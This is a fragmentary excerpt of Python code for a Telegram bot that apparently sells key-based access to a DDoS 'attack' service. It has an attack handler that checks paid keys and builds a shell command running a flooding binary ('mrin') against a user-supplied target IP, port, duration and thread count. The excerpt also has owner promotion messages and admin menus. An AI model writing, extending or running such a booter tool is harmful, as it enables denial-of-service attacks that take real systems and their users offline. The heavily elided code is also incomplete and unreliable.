...
def send_welcome(message):
    ...
    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! Developed By ᚛ @LostBoiXD , @LASTWISHES0 ᚜\n\n"
            f"Admin Commands:\n"
        ...
        welcome_message = (
            f"Welcome, Admin! Developed By ᚛ @LostBoiXD , @LASTWISHES0 ᚜\n\n"
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        ...
        # Construct command for dark binary with thread count and size
        command = f"./mrin {target_ip} {target_port} {duration} {thread_count}"
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By ᚛ @LostBoiXD , @LASTWISHES0 ᚜"  
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @LostBoiXD , @LASTWISHES0 ᚜*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @LostBoiXD , @LASTWISHES0 ᚜.*", parse_mode='Markdown')
        return
    ...
    if is_super_admin(user_id):
        ...
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = (
                ...
                "Contact ᚛ @LostBoiXD , @LASTWISHES0 ᚜ for assistance."
            )
        else:
            account_info = (
        ...
        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @LostBoiXD , @LASTWISHES0 ᚜."
